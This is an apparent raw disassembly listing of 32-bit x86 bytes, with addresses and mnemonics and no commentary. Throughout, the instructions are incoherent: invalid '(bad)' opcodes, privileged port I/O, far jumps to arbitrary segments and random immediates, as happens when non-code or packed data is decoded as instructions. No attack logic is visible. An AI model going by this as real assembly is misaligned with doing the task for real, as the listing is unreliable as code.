  420ed5:	or     cl,BYTE PTR [edi-0x3ee4fe1e]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	jge    0x420ee6
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	je     0x420e6d
  420ee4:	push   edi
  420ee5:	lock push esp
  420ee7:	dec    BYTE PTR [edx+edx*1]
  420eea:	mov    ch,0x99
  420eec:	mov    ss,WORD PTR [eax-0x6e6a5a5b]
  420ef2:	imul   edi,DWORD PTR [eax+0x56],0x3eed4872
  420ef9:	mov    esp,0x1cb3b871
  420efe:	xor    BYTE PTR [ecx+0x779e27f5],al
  420f04:	ins    BYTE PTR es:[edi],dx
  420f05:	dec    ebp
  420f06:	push   edx
  420f07:	jmp    0xd360:0x5b9fcc36
  420f0e:	test   BYTE PTR [ebx*2-0x33bcd83e],ch
  420f15:	ret    
  420f16:	fwait
  420f17:	cmp    ch,ah
  420f19:	fld    DWORD PTR [esi-0x6d1f1962]
  420f1f:	lock and edi,DWORD PTR [ebx+0x362c60af]
  420f26:	rcr    BYTE PTR ds:0x94aefb5e,cl
  420f2c:	ja     0x420f6d
  420f2e:	pop    ebx
  420f2f:	js     0x420f53
  420f31:	sub    al,BYTE PTR [ebp+0x6e8bfa61]
  420f37:	xchg   ebx,eax
  420f38:	dec    esp
  420f39:	or     BYTE PTR [ecx-0x43],dl
  420f3c:	add    DWORD PTR ds:0x77d18d30,0xee845656
  420f46:	push   0xffffffa9
  420f48:	lea    eax,[ebp+0x5ee27772]
  420f4e:	mov    edi,0x6c0bff1b
  420f53:	popf   
  420f54:	dec    esi
  420f55:	push   edx
  420f56:	pop    ebp
  420f57:	(bad)  
  420f58:	pop    edx
  420f59:	push   eax
  420f5a:	mov    al,ds:0x59f4ea45
  420f5f:	push   cs
  420f60:	pop    edi
  420f61:	push   es
  420f62:	(bad)  
  420f63:	les    ecx,FWORD PTR [ebx]
  420f65:	and    eax,0xa49727e
  420f6a:	ret    0x7ae7
  420f6d:	pop    esp
  420f6e:	in     al,dx
  420f6f:	(bad)  
  420f71:	pop    esp
  420f72:	inc    ecx
  420f73:	or     eax,0x3f81c72e
  420f78:	stc    
  420f79:	xchg   edx,eax
  420f7a:	jne    0x420f17
  420f7c:	xchg   ecx,eax
  420f7d:	aam    0xc4
  420f7f:	in     eax,dx
  420f80:	inc    edx
  420f81:	xor    DWORD PTR [ecx+0x1a72302e],ecx
  420f87:	jle    0x420f13
  420f89:	call   0xe9b56173
  420f8e:	pop    ebx
  420f8f:	push   ebp
  420f90:	daa    
  420f91:	rol    BYTE PTR [edi-0x24],cl
  420f94:	dec    esp
  420f95:	xchg   ebx,eax
  420f96:	outs   dx,BYTE PTR ds:[esi]
  420f97:	mov    cl,0x25
  420f99:	xor    DWORD PTR [edi],ebx
  420f9b:	lock daa 
  420f9d:	mov    ah,0x72
  420f9f:	lea    ebx,[edi-0x48]
  420fa2:	pop    esi
  420fa3:	jle    0x420f86
  420fa5:	or     cl,BYTE PTR [ecx+0x4e]
  420fa8:	sub    ch,cl
  420faa:	outs   dx,DWORD PTR ds:[esi]
  420fab:	js     0x420f50
  420fad:	cmc    
  420fae:	adc    al,0xa0
  420fb0:	push   edx
  420fb1:	retf   
  420fb2:	push   ecx
  420fb3:	loopne 0x420f4c
  420fb5:	in     al,dx
  420fb6:	nop
  420fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fb8:	xor    al,0x19
  420fba:	sahf   
  420fbb:	dec    edx
  420fbc:	push   cs
  420fbd:	cs mov ch,0xe9
  420fc0:	fs sub eax,0xf78926eb
  420fc6:	sbb    eax,0x90fdaced
  420fcb:	retf   0xc8ac
  420fce:	cdq    
  420fcf:	sbb    esi,DWORD PTR [ecx-0x26c6c5a]
  420fd5:	jmp    0xce7816a5
  420fda:	mov    eax,ds:0x62d74570
  420fdf:	xchg   ebp,eax
  420fe0:	xor    DWORD PTR [ebx],0x5d
  420fe3:	es fdiv st,st(5)
  420fe6:	fcomi  st,st(3)
  420fe8:	mov    esi,0x3a0570e3
  420fed:	pop    esi
  420fee:	dec    eax
  420fef:	push   eax
  420ff0:	nop
  420ff1:	stc    
  420ff2:	mov    ecx,0x6c5f78a3
  420ff7:	es inc ebx
  420ff9:	pop    edi
  420ffa:	ret    
  420ffb:	js     0x421066
  420ffd:	sub    BYTE PTR [edx],0xc4
  421000:	inc    ecx
  421001:	jp     0x420ff0
  421003:	inc    edx
  421004:	jmp    0x420f92
  421006:	fiadd  WORD PTR [edx+0x45abc548]
  42100c:	xor    bl,0xc2
  42100f:	not    DWORD PTR [ebx]
  421011:	jbe    0x420fa7
  421013:	cs or  eax,0xc1c625dc
  421019:	mov    ds:0xc5986267,eax
  42101e:	aaa    
  42101f:	and    al,BYTE PTR [ebp-0x77]
  421022:	pop    edx
  421023:	sub    BYTE PTR [esi],al
  421025:	fdivr  QWORD PTR [esi+0x2a9d35b2]
  42102b:	xchg   esp,eax
  42102c:	mov    ds:0x68bb3c6f,eax
  421031:	test   eax,0x65ce095a
  421036:	test   BYTE PTR [eax],0x49
  421039:	xor    bh,BYTE PTR gs:[esi+ecx*8-0x5df46a3]
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	cmp    al,BYTE PTR ds:0x8e1b9062
  421048:	shl    DWORD PTR [esi-0x22dc234d],1
  42104e:	pop    ds
  42104f:	xchg   ebx,eax
  421050:	pop    esp
  421051:	stc    
  421052:	test   eax,0x7a916119
  421057:	xchg   edx,eax
  421058:	mov    ecx,eax
  42105a:	mov    bl,0x4
  42105c:	js     0x421075
  42105e:	iret   
  42105f:	sbb    eax,DWORD PTR [ebx]
  421061:	jmp    0x4314:0x34dc79f7
  421068:	push   ss
  421069:	sbb    DWORD PTR [esi-0x50],ebp
  42106c:	sub    al,0x95
  42106e:	add    al,0x1e
  421070:	fcmovnbe st,st(7)
  421072:	iret   
  421073:	sub    eax,0x7720da13
  421078:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42107a:	push   es
  42107b:	jmp    0x7c3675bb
  421080:	vpmaxsw ymm1,ymm7,YMMWORD PTR [ecx+0x6585e039]
  421088:	cmp    eax,edi
  42108a:	adc    eax,0x3d1cbf17
  42108f:	inc    edx
  421090:	adc    al,0xb7
  421092:	les    ebx,FWORD PTR [esi+0x51f7df07]
  421098:	sahf   
  421099:	adc    eax,0x3076461c
  42109e:	call   0x8788:0x6892c525
  4210a5:	mul    DWORD PTR [eax]
  4210a7:	inc    ebx
  4210a8:	jno    0x421088
  4210aa:	pop    es
  4210ab:	fwait
  4210ac:	in     eax,0xe1
  4210ae:	mov    ds:0x5108d8c9,al
  4210b3:	xor    edi,DWORD PTR ds:0xaf2b5119
  4210b9:	mov    al,0xc5
  4210bb:	cwd    
  4210bd:	addr16 dec ebx
  4210bf:	sub    DWORD PTR [ebx],esi
  4210c1:	and    al,0x39
  4210c3:	hlt    
  4210c4:	fmul   QWORD PTR [edi-0x57]
  4210c7:	mov    ebx,0xdd9c294a
  4210cc:	imul   esi,DWORD PTR [edi+esi*2+0xbe6c25d],0x88fcc1b0
  4210d7:	adc    al,0xe0
  4210d9:	jge    0x42107e
  4210db:	add    al,0x53
  4210dd:	sub    al,0xfd
  4210df:	pop    esi
  4210e0:	cs aam 0xa
  4210e3:	hlt    
  4210e4:	mov    ds:0xf4da8b45,al
  4210e9:	nop
  4210ea:	out    dx,eax
  4210eb:	mov    al,ds:0x84bd50e0
  4210f0:	loopne 0x42110b
  4210f2:	inc    esp
  4210f3:	mov    edi,0xbc94f95d
  4210f8:	loop   0x421164
  4210fa:	push   ds
  4210fb:	fisub  DWORD PTR [eax]
  4210fd:	push   ebx
  4210fe:	fild   WORD PTR [ecx+eax*4]
  421101:	push   ds
  421102:	fisttp DWORD PTR [ebx+0x540a0537]
  421108:	cdq    
  421109:	call   0xa245:0x9c6d3723
  421110:	jl     0x4210c4
  421112:	adc    BYTE PTR [eax+ecx*8+0x15d08711],al
  421119:	cmp    al,0xb6
  42111b:	jmp    0x56eb6242
  421120:	shl    ah,cl
  421122:	pop    esp
  421123:	sar    DWORD PTR [edx],cl
  421125:	add    ecx,DWORD PTR [ecx+ebx*2+0x33]
  421129:	test   DWORD PTR [esi+edx*8],esp
  42112c:	add    al,0xf
  42112e:	mov    ch,0x8b
  421130:	jae    0x42111e
  421132:	jge    0x4210e4
  421134:	sub    DWORD PTR [ebp*8-0x6ae085b],0x20
  42113c:	ins    BYTE PTR es:[edi],dx
  42113d:	outs   dx,BYTE PTR ds:[esi]
  42113e:	inc    eax
  42113f:	mov    dh,bh
  421141:	lods   eax,DWORD PTR ds:[esi]
  421142:	ins    DWORD PTR es:[edi],dx
  421143:	retf   
  421144:	enter  0xb87d,0x7b
  421148:	sti    
  421149:	pop    ds
  42114a:	xacquire xchg DWORD PTR [ecx],esi
  42114d:	jl     0x421164
  42114f:	adc    bh,cl
  421151:	mov    ebx,0xb2e167e5
  421156:	jp     0x42110a
  421158:	inc    ebx
  421159:	lock xchg ebx,eax
  42115b:	xor    ch,dh
  42115d:	inc    ebp
  42115e:	fcomp  DWORD PTR [ebp-0xa]
  421161:	or     edx,DWORD PTR [ebx]
  421163:	adc    al,0xb
  421165:	(bad)  
  421166:	push   ebp
  421167:	ret    
  421168:	xchg   esi,eax
  421169:	shl    DWORD PTR ds:0x8b3f4c5,1
  42116f:	sbb    eax,edi
  421171:	push   ss
  421172:	mov    ds:0xab727261,al
  421177:	sub    bh,BYTE PTR [ebp+edi*4+0x55]
  42117b:	mov    esi,0xaaa4dbef
  421180:	xchg   ebp,eax
  421181:	xchg   esi,eax
  421182:	adc    DWORD PTR [ecx-0xdfc010c],esp
  421188:	sti    
  421189:	xor    ebp,eax
  42118b:	les    esi,FWORD PTR [ecx+0xb082b5e]
  421191:	or     cl,BYTE PTR [edi+0x635a1ac0]
  421197:	jle    0x421149
  421199:	push   ecx
  42119a:	pop    ebp
  42119b:	ins    BYTE PTR es:[edi],dx
  42119c:	stc    
  42119d:	imul   esp
  42119f:	pop    ebx
  4211a0:	mov    ds,edx
  4211a2:	and    cl,BYTE PTR [edx+eiz*8]
  4211a5:	ins    DWORD PTR es:[edi],dx
  4211a6:	dec    ebx
  4211a7:	outs   dx,BYTE PTR ds:[esi]
  4211a8:	inc    edi
  4211a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211aa:	arpl   WORD PTR [edi+eiz*4],bx
  4211ad:	mov    bh,0x21
  4211af:	jle    0x421132
  4211b1:	sbb    eax,0x458cf0ee
  4211b6:	pop    ebp
  4211b7:	pop    es
  4211b8:	dec    ecx
  4211b9:	sub    ch,BYTE PTR [ebx-0x5b]
  4211bc:	aam    0x58
  4211be:	jns    0x42123c
  4211c0:	add    al,0x85
  4211c2:	in     al,dx
  4211c3:	cmp    DWORD PTR [edx+0x7d],0xffffff91
  4211c7:	scas   al,BYTE PTR es:[edi]
  4211c8:	scas   al,BYTE PTR es:[edi]
  4211c9:	or     edi,DWORD PTR [eax+ebx*4+0x3f8a0e96]
  4211d0:	or     DWORD PTR [ebp+0x174d54a1],ebx
  4211d6:	mov    ah,0x1d
  4211d8:	into   
  4211d9:	jp     0x421240
  4211db:	and    BYTE PTR [esi+eax*1+0xa6ff14f],ah
  4211e2:	(bad)  
  4211e3:	pop    esp
  4211e4:	fcomp  DWORD PTR [ecx+0x1a]
  4211e7:	dec    ecx
  4211e8:	mov    esi,0xed9d34f4
  4211ed:	into   
  4211ee:	popa   
  4211ef:	or     esp,DWORD PTR [ecx]
  4211f1:	stos   BYTE PTR es:[edi],al
  4211f2:	dec    esp
  4211f3:	pushf  
  4211f4:	add    eax,0x817829fc
  4211f9:	sbb    al,0xe6
  4211fb:	pop    eax
  4211fc:	std    
  4211fd:	cdq    
  4211fe:	pop    ecx
  4211ff:	or     dl,BYTE PTR [eax+0x6f]
  421202:	mov    bl,0x5f
  421204:	lds    esp,FWORD PTR [ecx]
  421206:	les    esi,FWORD PTR [ecx]
  421208:	ret    
  421209:	jecxz  0x4211db
  42120b:	and    ecx,edx
  42120d:	retf   0xa3de
  421210:	sbb    DWORD PTR [eax-0x43b84614],eax
  421216:	add    edx,DWORD PTR [ebp+0x7c3ab5d2]
  42121c:	fstp   st(0)
  42121e:	pop    es
  42121f:	xor    al,0x2d
  421221:	cwde   
  421222:	push   edx
  421223:	inc    ecx
  421224:	test   DWORD PTR [ebx-0x71],ecx
  421227:	dec    ebp
  421228:	fcomp  QWORD PTR [eax+0x77]
  42122b:	or     eax,0x2d8c7d95
  421230:	mov    ecx,0x9c88e994
  421235:	jge    0x42122c
  421237:	mov    bl,0x2d
  421239:	aad    0x10
  42123b:	pop    es
  42123c:	enter  0x6f53,0xbf
  421240:	cmp    esp,ebx
  421242:	adc    BYTE PTR [edx-0x29],dh
  421245:	xchg   ebx,eax
  421246:	loope  0x42129f
  421248:	adc    BYTE PTR [esi+ebp*8+0x1e74dc1f],ah
  42124f:	sbb    DWORD PTR [ebp-0x58],esi
  421252:	(bad)  
  421253:	push   0x5ecf2e72
  421258:	and    dl,BYTE PTR [ebp-0x5c20a26f]
  42125e:	or     bl,al
  421260:	push   0x6dc8c9c2
  421265:	mov    ecx,0x9e318ce9
  42126a:	ins    BYTE PTR es:[edi],dx
  42126b:	cmp    DWORD PTR [esi-0x7d],ebx
  42126e:	jb     0x4212d3
  421270:	(bad)  
  421271:	xor    ebp,DWORD PTR [ebp+0x11]
  421274:	mov    bl,BYTE PTR [eax-0x10]
  421277:	sar    BYTE PTR [ebx-0x105c7d77],cl
  42127d:	push   ecx
  42127e:	addr16 cmp eax,0x2b3c838b
  421284:	cld    
  421285:	mov    ch,0x9e
  421287:	jb     0x4212ba
  421289:	enter  0xa332,0x89
  42128d:	mov    ch,BYTE PTR [esi+0x7ac70137]
  421293:	mov    ds:0xdbe19c1,eax
  421298:	mov    ds:0x1f5b0d5d,al
  42129d:	push   ebp
  42129e:	and    BYTE PTR [ecx],0xbe
  4212a1:	retf   
  4212a2:	and    al,0xd7
  4212a4:	and    esi,edx
  4212a6:	fidivr DWORD PTR [esi]
  4212a8:	adc    bh,BYTE PTR [edx-0x76]
  4212ab:	(bad)  [ecx-0x5af15c7d]
  4212b1:	fiadd  WORD PTR [ecx+0x190fd776]
  4212b7:	mov    DWORD PTR [ecx+0x78],0x6b4bf669
  4212be:	or     eax,0xf33034bf
  4212c3:	mov    ebp,?
  4212c5:	and    al,BYTE PTR [edx-0x39]
  4212c8:	fwait
  4212c9:	sbb    eax,0xb4f526c7
  4212ce:	xor    BYTE PTR [esi+0x15],ch
  4212d1:	out    0x13,al
  4212d3:	push   ecx
  4212d4:	inc    esp
  4212d6:	ret    
  4212d7:	inc    ebp
  4212d8:	cmp    al,0xb0
  4212da:	in     al,dx
  4212db:	data16 ja 0x42130c
  4212de:	xlat   BYTE PTR ds:[ebx]
  4212df:	clts   
  4212e1:	jg     0x421309
  4212e3:	in     al,0xe3
  4212e5:	mov    BYTE PTR [edx-0x4a41c86b],dl
  4212eb:	mov    ecx,0x3ceb491e
  4212f0:	push   ebp
  4212f1:	xchg   ecx,eax
  4212f2:	shr    BYTE PTR [edx+0x53],0x57
  4212f6:	shr    BYTE PTR [esi+0x503e4d46],1
  4212fc:	div    BYTE PTR [ecx]
  4212fe:	push   edi
  4212ff:	adc    ch,ah
  421301:	pop    esi
  421302:	ja     0x42129b
  421304:	sbb    BYTE PTR [eax],bh
  421306:	jno    0x421360
  421308:	scas   eax,DWORD PTR es:[edi]
  421309:	out    0x1f,eax
  42130b:	cmp    ebx,ecx
  42130d:	adc    dl,BYTE PTR [eax+0x63]
  421310:	sbb    BYTE PTR [ebp-0x62],bh
  421313:	or     dh,dl
  421315:	xchg   esi,eax
  421316:	mov    ebx,0x475e4600
  42131b:	adc    ecx,DWORD PTR [esi]
  42131d:	call   0xef41e3d6
  421322:	and    esp,DWORD PTR ds:0x1e655f1e
  421328:	fiadd  WORD PTR [esi+0x6a]
  42132b:	mov    cl,0x41
  42132d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42132e:	push   ebp
  42132f:	fdiv   QWORD PTR [ebx]
  421331:	shl    BYTE PTR [esi-0xf],cl
  421334:	or     BYTE PTR [ebp-0x21046b92],0xf8
  42133b:	inc    edx
  42133c:	jo     0x42130d
  42133e:	test   al,0xc8
  421340:	pushf  
  421341:	jecxz  0x421394
  421343:	into   
  421344:	ds out 0x17,eax
  421347:	or     cl,BYTE PTR [ecx]
  421349:	(bad)  
  42134a:	xchg   edi,eax
  42134b:	fstp   DWORD PTR [ebp-0x5e]
  42134e:	dec    edx
  42134f:	(bad)  
  421350:	sti    
  421351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421352:	es call 0xa47cd737
  421358:	sub    DWORD PTR ds:0xb3aeb8f7,edx
  42135e:	mov    al,ds:0x73652633
  421363:	inc    edx
  421364:	lds    edx,FWORD PTR [esi-0x68dff602]
  42136a:	fistp  QWORD PTR [ecx+ebx*1]
  42136d:	jmp    0x19442f3a
  421372:	enter  0xd83,0x65
  421376:	popf   
  421377:	mov    edi,0xf0e343ba
  42137c:	push   es
  42137d:	jnp    0x4213b8
  42137f:	jae    0x42135c
  421381:	push   0xf8bec89d
  421386:	arpl   WORD PTR ds:[ebp+0x42],di
  42138a:	rol    al,cl
  42138c:	cmp    ebp,DWORD PTR [edi-0x5d]
  42138f:	(bad)  
  421390:	test   al,0xaf
  421392:	inc    ebx
  421393:	mov    cl,0x22
  421395:	mov    eax,0xa787a199
  42139a:	psubsb mm7,QWORD PTR [ebp-0x38eab4b0]
  4213a1:	fld    DWORD PTR [ebp+0x20f5983c]
  4213a7:	cmp    eax,ebx
  4213a9:	push   esi
  4213aa:	inc    eax
  4213ab:	or     bh,al
  4213ad:	push   ebp
  4213ae:	or     cl,BYTE PTR [esi+0x4c]
  4213b1:	pop    ebp
  4213b2:	sub    dl,BYTE PTR [ebp-0x1d]
  4213b5:	sub    al,BYTE PTR [eax-0x7a2af606]
  4213bb:	pop    esi
  4213bc:	pop    ss
  4213bd:	add    eax,0xafe9c5bd
  4213c2:	ja     0x42135f
  4213c4:	or     al,0x1f
  4213c6:	mov    ch,0xff
  4213c8:	push   ds
  4213c9:	mov    dh,0xbc
  4213cb:	adc    al,0x7f
  4213cd:	(bad)  
  4213ce:	lock mov DWORD PTR [edi-0x5355a9e7],eax
  4213d5:	inc    esi
  4213d6:	pop    edx
  4213d7:	xor    al,0x64
  4213d9:	sub    eax,DWORD PTR [edi-0x1c]
  4213dc:	gs or  al,0xd4
  4213df:	xchg   edi,eax
  4213e0:	scas   eax,DWORD PTR es:[edi]
  4213e1:	xchg   ebp,eax
  4213e2:	adc    al,0x8d
  4213e4:	aad    0xae
  4213e6:	int3   
  4213e7:	push   0xecf1c927
  4213ec:	out    0xe4,al
  4213ee:	push   eax
  4213ef:	push   ebx
  4213f0:	repz std 
  4213f2:	push   edx
  4213f3:	and    BYTE PTR [edx-0x4a040307],0x94
  4213fa:	jmp    0x6d240847
  4213ff:	pop    edi
  421400:	ret    0x8a36
  421403:	fwait
  421404:	cmp    eax,0x2f4a2c84
  421409:	adc    al,BYTE PTR [ebp-0x1b]
  42140c:	and    BYTE PTR [eax],0x45
  42140f:	loop   0x4213ea
  421411:	or     al,0xb3
  421413:	out    dx,al
  421414:	mov    ebp,0xa1a1831f
  421419:	sar    DWORD PTR [ebp+0x43],0x88
  42141d:	sbb    BYTE PTR [ebp+0x3a],0xd9
  421421:	mov    al,ds:0x63b63c91
  421426:	aad    0xea
  421428:	inc    edi
  421429:	xor    DWORD PTR [eax+0x3e],ecx
  42142c:	mov    dl,0x1a
  42142f:	mov    eax,ds:0x40b096ed
  421434:	jbe    0x42141e
  421436:	aad    0xb
  421438:	cmp    al,0xfd
  42143a:	(bad)  
  42143b:	test   eax,0x5b7f4c2
  421440:	xchg   ecx,eax
  421441:	out    dx,eax
  421442:	je     0x42141e
  421444:	mov    edi,esi
  421446:	outs   dx,DWORD PTR ds:[esi]
  421447:	mov    eax,cs
  421449:	push   eax
  42144a:	cld    
  42144b:	inc    ebp
  42144c:	mov    al,0xd5
  42144e:	je     0x4213e6
  421450:	adc    eax,0x3ac8879e
  421455:	adc    BYTE PTR ds:0x5e3e46c2,dh
  42145b:	hlt    
  42145c:	leave  
  42145d:	mov    ecx,DWORD PTR [edx-0x78f1a16d]
  421463:	mov    DWORD PTR [edi-0x42],esp
  421466:	xchg   ebx,eax
  421467:	or     eax,0x98616e6
  42146c:	movntps XMMWORD PTR [ebp-0x411d6c16],xmm7
  421473:	fst    QWORD PTR [ebx]
  421475:	jmp    0x42141c
  421477:	test   dl,ah
  421479:	mov    ah,0x51
  42147b:	pop    ds
  42147c:	mov    DWORD PTR [ebx],0xd184f9c5
  421482:	or     bl,BYTE PTR [edi-0x1e]
  421485:	in     al,0xe5
  421487:	mov    ebx,0xe4a1a475
  42148c:	cdq    
  42148d:	stos   DWORD PTR es:[edi],eax
  42148e:	in     al,dx
  42148f:	and    eax,0x285c4a47
  421494:	je     0x4214ae
  421496:	mov    eax,0xc8df0514
  42149b:	push   0x7d43349f
  4214a0:	cli    
  4214a1:	sub    al,0xd4
  4214a3:	outs   dx,DWORD PTR ds:[esi]
  4214a4:	sbb    al,0x73
  4214a6:	mov    DWORD PTR [eax+0x28],edi
  4214a9:	(bad)  
  4214aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ab:	in     eax,0x25
  4214ad:	xchg   ebx,eax
  4214ae:	mov    DWORD PTR [ecx-0xb],edi
  4214b1:	mov    esp,0x79cd5fad
  4214b6:	pop    esi
  4214b7:	call   0x5c71:0xd69c8c91
  4214be:	cmp    eax,0xbd5325bc
  4214c3:	repz dec ebp
  4214c5:	stc    
  4214c6:	ins    BYTE PTR es:[edi],dx
  4214c7:	push   DWORD PTR [esi-0x7cf1147f]
  4214cd:	lods   al,BYTE PTR ds:[esi]
  4214ce:	in     al,dx
  4214cf:	cdq    
  4214d0:	or     DWORD PTR [esp+esi*2],0x65864d37
  4214d7:	dec    ecx
  4214d8:	scas   al,BYTE PTR es:[edi]
  4214d9:	rol    BYTE PTR [ebx+0x5166b26e],0xff
  4214e0:	nop
  4214e1:	es mov ecx,0x4468533b
  4214e7:	jmp    0x42150b
  4214e9:	repnz rcr esp,cl
  4214ec:	loopne 0x42150e
  4214ee:	push   edx
  4214ef:	repnz popa 
  4214f1:	int    0x96
  4214f3:	inc    esi
  4214f4:	jno    0x4214be
  4214f6:	fcom   DWORD PTR [ebx+eiz*1-0x20]
  4214fa:	enter  0xcf1,0x30
  4214fe:	xchg   ebp,eax
  4214ff:	xchg   edx,eax
  421500:	rcl    BYTE PTR [edx-0x3d],0xef
  421504:	cmp    DWORD PTR [edi-0x12],esi
  421507:	push   eax
  421508:	repz (bad) 
  42150a:	mov    eax,ds:0x976c1a24
  42150f:	push   ss
  421510:	and    cl,BYTE PTR [edi]
  421512:	shl    BYTE PTR [edi+eax*2+0x43198f89],cl
  421519:	loop   0x4214ee
  42151b:	xor    eax,0x74da0d7f
  421520:	gs jns 0x421589
  421523:	enter  0xbab9,0xc
  421527:	cli    
  421528:	repnz addr16 inc ecx
  42152b:	fnstcw WORD PTR [ecx-0x274b71ad]
  421531:	jp     0x421547
  421533:	das    
  421534:	cmp    esp,DWORD PTR [eax]
  421536:	test   al,0xcb
  421538:	xchg   edi,eax
  421539:	ins    BYTE PTR es:[edi],dx
  42153a:	xchg   DWORD PTR [ebx],esp
  42153c:	(bad)  
  42153e:	lods   eax,DWORD PTR ds:[esi]
  42153f:	loop   0x42158f
  421541:	sbb    eax,0x90fc2620
  421546:	xchg   ebp,eax
  421547:	inc    ebx
  421548:	pop    ss
  421549:	dec    esi
  42154a:	push   ebx
  42154b:	inc    ecx
  42154c:	(bad)  
  42154d:	pop    edi
  42154e:	xchg   esi,eax
  42154f:	int3   
  421550:	arpl   WORD PTR [edx-0x71],cx
  421553:	retf   0x763
  421556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421557:	mov    edx,0xeffd8b2f
  42155c:	dec    ecx
  42155d:	mov    bl,0x7
	...
  421567:	add    BYTE PTR [eax],al
  421569:	add    BYTE PTR [edi+0x5a],dl
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x7b4c9db5
  421579:	dec    edi
  42157a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42157c:	add    DWORD PTR [eax],eax
  42157e:	jge    0x421586
  421580:	add    BYTE PTR [eax],al
  421582:	clc    
  421583:	or     al,0x6e
  421585:	push   ds
  421586:	enter  0x744a,0x90
  42158a:	imul   eax,eax,0x3f
  42158d:	sub    eax,0x44da6a4e
  421592:	aam    0xf9
  421594:	adc    BYTE PTR [esi-0x10],al
  421597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421598:	mov    eax,0xd05e92b4
  42159d:	mov    ecx,0x2c6b093a
  4215a2:	mov    WORD PTR [eax-0x7a],fs
  4215a5:	lock mov ?,ebx
  4215a8:	sub    eax,DWORD PTR [eax+0x21845e38]
  4215ae:	repnz iret 
  4215b0:	inc    edx
  4215b1:	mov    bh,0x67
  4215b3:	in     al,dx
  4215b4:	inc    esp
  4215b6:	pop    eax
  4215b7:	xchg   BYTE PTR [esi],dh
  4215b9:	xor    DWORD PTR [ebx],0xf
  4215bc:	fadd   st,st(4)
  4215be:	mov    DWORD PTR [edx-0x79],esi
  4215c1:	leave  
  4215c2:	adc    DWORD PTR [ebx-0x5],ebp
  4215c5:	leave  
  4215c6:	mov    BYTE PTR [ebp-0x1d],al
  4215c9:	inc    edi
  4215ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215cb:	push   es
  4215cc:	xchg   bh,dl
  4215ce:	add    esp,DWORD PTR [esi+0xd1cdf9e]
  4215d4:	xor    DWORD PTR [esi+edx*1-0x63],eax
  4215d8:	lea    ebx,[eax-0x7c934cf5]
  4215de:	and    dh,ah
  4215e0:	(bad)  
  4215e2:	outs   dx,DWORD PTR ds:[esi]
  4215e3:	lods   al,BYTE PTR ds:[esi]
  4215e4:	adc    DWORD PTR [edi],0x6a
  4215e7:	cdq    
  4215e8:	clc    
  4215e9:	outs   dx,BYTE PTR ds:[esi]
  4215ea:	dec    eax
  4215eb:	pushf  
  4215ec:	popf   
  4215ed:	(bad)  
  4215ee:	es aam 0x7e
  4215f1:	jae    0x421591
  4215f3:	call   0xcde1f7b
  4215f8:	addr16 enter 0x45d9,0x3a
  4215fd:	lock in eax,0x58
  421600:	xchg   DWORD PTR [ecx+ebx*1-0x5c834dc3],edi
  421607:	adc    BYTE PTR [esi-0x72],cl
  42160a:	mov    eax,0xf93df509
  42160f:	lods   eax,DWORD PTR ds:[esi]
  421610:	pop    ebp
  421611:	(bad)  
  421612:	int3   
  421613:	or     ebp,DWORD PTR [ebp+0x69]
  421616:	imul   ebp,DWORD PTR [edi-0x1],0x50a1b879
  42161d:	add    ecx,DWORD PTR [edi-0x57]
  421620:	xchg   ecx,eax
  421621:	imul   BYTE PTR ds:0x1ffb684d
  421627:	in     al,0x16
  421629:	stc    
  42162a:	sbb    al,0x1b
  42162c:	jmp    0x9910:0x7093aa5f
  421633:	push   ebx
  421634:	or     bh,BYTE PTR [edx]
  421636:	pop    esi
  421637:	sub    ebp,DWORD PTR [eax]
  421639:	xchg   esp,eax
  42163a:	fld    DWORD PTR [eax-0x6b]
  42163d:	or     al,0x30
  42163f:	mov    ch,0xb
  421641:	ret    0x7df9
  421644:	mov    ds:0x341d09ac,al
  421649:	add    eax,0xef228412
  42164e:	dec    ebx
  42164f:	inc    eax
  421650:	mov    ds:0xf919341,eax
  421655:	cdq    
  421656:	sar    DWORD PTR [ecx-0x56],cl
  421659:	ds xor BYTE PTR gs:[esi-0x37b3eb6],0xf2
  421662:	dec    edi
  421663:	cmp    ebp,0xb
  421666:	mov    ds:0x2a239d16,al
  42166b:	out    0x28,al
  42166d:	xchg   esp,eax
  42166e:	mov    dl,0xc6
  421670:	repz or DWORD PTR [ebp-0x71256330],0x7
  421678:	(bad)  
  421679:	dec    BYTE PTR [edx+edi*4]
  42167c:	mov    dl,0x32
  42167e:	test   eax,0xf35701d4
  421683:	add    DWORD PTR [ebp-0x525ec39f],0xffffff94
  42168a:	adc    BYTE PTR [edx],bl
  42168c:	pop    esi
  42168d:	xchg   ecx,eax
  42168e:	loop   0x4216ec
  421690:	jge    0x42163a
  421692:	cld    
  421693:	icebp  
  421694:	push   0x48
  421696:	mov    bl,0x77
  421698:	xor    dh,dh
  42169a:	outs   dx,BYTE PTR ds:[esi]
  42169b:	jmp    0x4216e2
  42169d:	call   0xa85d:0x6829336
  4216a4:	aaa    
  4216a5:	stos   DWORD PTR es:[edi],eax
  4216a6:	jbe    0x4216e4
  4216a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216a9:	in     eax,dx
  4216aa:	fnstenv [esi]
  4216ac:	lods   eax,DWORD PTR ds:[esi]
  4216ad:	xchg   esp,eax
  4216ae:	sbb    dl,al
  4216b0:	inc    eax
  4216b1:	jp     0x4216ec
  4216b3:	push   eax
  4216b4:	xor    al,0x1c
  4216b6:	jns    0x421689
  4216b8:	xor    eax,0x6fc88c47
  4216bd:	aad    0x5f
  4216bf:	push   cs
  4216c0:	mov    ds:0x9eb843fb,al
  4216c5:	repz aaa 
  4216c7:	dec    esi
  4216c8:	addr16 add al,0xd5
  4216cb:	xor    ecx,edi
  4216cd:	inc    ebp
